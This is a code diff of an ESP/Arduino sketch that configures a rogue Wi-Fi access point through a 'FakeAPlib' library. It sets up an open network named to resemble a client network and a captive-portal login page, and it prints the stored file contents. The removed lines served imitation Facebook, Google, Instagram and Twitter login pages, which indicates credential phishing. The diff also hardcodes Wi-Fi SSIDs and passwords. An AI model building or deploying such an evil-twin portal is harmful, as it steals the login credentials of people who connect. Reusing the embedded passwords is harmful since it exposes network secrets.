@@ -1,26 +1,20 @@
+#define LOG_FILE "/data/logs.txt"
+
 #include <FakeAPlib.h>
 
 
 //variable para el nombre del wifi
-const char* SSID   = "ESP.local-server";
-const char* PASS   = "SECUREhash9361";
-const char* WIFI_SSID = "Finetwork_82FBD";
-const char* WIFI_PSW  = "2c2D4GeA";
+const char* SSID   = "Elastic-cliente";
+const char* WIFI_SSID = "ESP.local-server";
+const char* WIFI_PSW  = "SECUREhash9361";
 
-const char* DATA_FILE = "/data/data.yaml";
-const char* AUTH_PAGE = "/webpages/index.html";
-const char* THKS_PAGE = "/webpages/thanksPage.html";
+const char* AUTH_PAGE  = "/webpages/index.html";
 
-const char* FB_PATH = "/webpages/facebook-login";
-const char* GL_PATH = "/webpages/google-login";
-const char* IS_PATH = "/webpages/instagram-login";
-const char* TW_PATH = "/webpages/twitter-login";
-
-//IPAddress apip(192,168,1,1);
-const IPAddress* serverip = new IPAddress(10,10,1,1);
+IPAddress* apip = new IPAddress(192,168,1,1);
+IPAddress* serverip = new IPAddress(10,10,10,1);
 //byte apmac[6];
 
-FakeAp* accessPoint = new FakeAp(80);
+FakeAP* accessPoint = new FakeAP(80);
 int printed = 0;
 
 void setup()
@@ -33,26 +27,17 @@ void setup()
   delay(1000);
 
   Serial.println("File dir test: ");
-  Serial.println(SDCardManager::getFileDir(THKS_PAGE));
   
-  accessPoint->setPath(AUTH_PAGE, INDEXPAGE);
-  accessPoint->setPath(THKS_PAGE, EXITPAGE);
-  accessPoint->setPath(DATA_FILE, DATAFILE);
+  accessPoint->setPath(AUTH_PAGE,  INDEXPAGE);
 
-  accessPoint->setPath(FB_PATH, FACEBOOK);
-  accessPoint->setPath(GL_PATH, GOOGLE);
-  accessPoint->setPath(IS_PATH, INSTAGRAM);
-  accessPoint->setPath(TW_PATH, TWITTER);
-
-  WiFi.mode(WIFI_AP_STA);
-  WiFi.softAPConfig(*serverip, *serverip, IPAddress(255, 255, 0, 0));
-  if (!accessPoint->initialize(SSID, PASS))
+  WiFi.mode(WIFI_AP);
+  WiFi.hostname("ESP.server");
+  WiFi.softAPConfig(*apip, *apip, IPAddress(255, 255, 255, 0));
+  if (!accessPoint->initialize(SSID, "", WIFI_SSID, WIFI_PSW))
     Serial.println("Error en la configuración del punto de acceso");
 
-
-  WiFi.hostname("ESP.server");
-  if (!accessPoint->setWifiStation(WIFI_SSID, WIFI_PSW))
-    Serial.println("Conexión a la wifi fallada.");
+  //if (!accessPoint->setWifiStation(WIFI_SSID, WIFI_PSW))
+    // Serial.println("Conexión a la wifi fallada.");
 
   Serial.println("Config done!");
   
@@ -63,6 +48,7 @@ void loop()
   accessPoint->process();
 
   if (printed<=0){
+    Serial.printf("server ip: %s\n", accessPoint->getServerIp().toString().c_str());
     accessPoint->printFilesContent();
     printed++;
   }
